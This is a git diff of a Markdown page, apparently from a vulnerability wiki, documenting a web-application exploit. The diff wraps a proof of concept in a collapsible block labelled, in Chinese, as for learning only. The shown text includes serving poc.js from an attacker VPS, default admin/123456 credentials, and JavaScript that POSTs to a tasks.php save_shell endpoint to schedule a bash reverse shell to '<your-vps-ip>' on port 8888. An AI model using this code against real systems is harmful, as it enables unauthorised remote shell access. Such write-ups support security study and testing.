@@ -75,8 +75,10 @@ python3 -m http.server 9999
 
 ```
 <script src="http://<your-vps-ip>:9999/poc.js"></script>
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![image-20230519100003117](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230519100003117.png)
 
 通过方式 1，已经获得了用户名/密码为 admin/123456，进入后台验证一下计划任务是否成功写入：
@@ -134,7 +136,7 @@ function save() {
   data.day = '3';
   data.hour = '1';
   data.minute = '1';
-  data.shell = 'bash -i >& /dev/tcp/<your-vps-ip>/8888 0>&1';;
+  data.shell = '&#98;ash -i &gt;&amp; &#47;dev/tcp/&lt;your-vps-ip&gt;/8888 0&gt;&amp;1';;
   $.ajax({
       url: '/service/app/tasks.php?type=save_shell',
       type: 'POST',
@@ -150,8 +152,9 @@ function save() {
   });
 }
 
-save();
-```
+save();</code></pre>
+
+</details>
 
 ---
 
